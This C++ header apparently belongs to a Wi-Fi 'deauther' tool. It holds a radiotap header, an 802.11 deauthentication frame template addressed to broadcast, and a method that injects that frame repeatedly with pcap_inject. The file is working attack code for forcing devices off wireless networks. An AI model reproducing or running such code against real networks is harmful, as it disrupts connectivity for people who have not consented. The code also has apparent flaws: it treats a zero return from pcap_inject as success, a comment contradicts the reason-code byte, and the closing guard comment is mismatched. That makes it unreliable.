#ifndef DEAUTHER_P_H
#define DEAUTHER_P_H

#include "deauther.h"


const unsigned char radiotap_h[13] = {
    /*  0 - 1  */ 0x00, 0x00,               // <-- radiotap version + pad byte
    /*  2 - 3  */ 0x0d, 0x00,               // <- radiotap header length
    /*  4 - 7  */ 0x04, 0x80, 0x02, 0x00,   // <-- bitmap
    /*  8 - 9  */ 0x02, 0x00,               // <-- rate (in 500kHz units)
    /* 10 - 11 */ 0x00, 0x00,               // <-- tx flags
    /* 12      */ 0x00,                     //<-- retries
};

const unsigned char deauth_packet[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x3A, 0x01,                         // duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // st addr place holder
    /* 16 - 21 */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // ap addr place holder
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x07, 0x00                          // reason code (1 = unspecified reason)
};


class DeautherPrivate
{
    DeautherPrivate ();

    void send_packet (QByteArray packet, int size, int count, Deauther *dd)
    {
        const uchar* pk_data = reinterpret_cast<const uchar*>(packet.data());
        bool sent_packet = false;

        // send number of packets equal to count
        dd->station_mutex.lock();
        for (int i=0; i<count; ++i)
        {
            if(pcap_inject (dd->iface_handle, pk_data, size) == 0)
            {
                sent_packet = true;
            }
        }

        // warning if all packets send operations fail
        if (!sent_packet)
        {
            qWarning() << "Warning: failed to send 2GHz deauth packet";
            qWarning() << Qt::endl;
        }
        dd->station_mutex.unlock();
    }





};


#endif // STATION_MODEL_P_H
